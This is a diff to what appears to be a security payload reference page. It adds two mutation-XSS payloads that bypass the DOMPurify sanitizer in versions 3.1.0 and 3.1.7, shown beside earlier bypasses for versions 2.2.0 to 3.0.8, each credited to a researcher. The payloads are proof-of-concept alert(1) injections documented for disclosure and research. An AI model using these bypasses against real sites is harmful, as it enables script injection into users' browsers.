@@ -15,6 +15,8 @@ This page contains some examples of payloads used to bypass sanitizers in the pa
 | 2.2.0   | `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`                        | Daniel Santos [@bananabr](https://twitter.com/bananabr) | <https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f>  |
 | 2.2.3   | `<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">` | Michał Bentkowski [@SecurityMB](https://twitter.com/SecurityMB) | <https://twitter.com/SecurityMB/status/1341290687963262978> |
 | 3.0.8   | `<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">`                              | Kévin - Mizu [@kevin_mizu](https://twitter.com/kevin_mizu) | <https://mizu.re/post/playing-with-dompurify-ce-handling> |
+| 3.1.0   | ```n = 506; var payload = `${"<div>".repeat(n)}<table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table>${"</div>".repeat(n)}`;``` | [icesfont](https://github.com/icesfont) | N/A |
+| 3.1.7   | `<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">.` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://x.com/kinugawamasato/status/1843687909431582830> |
 
 ## Mozilla Bleach
 
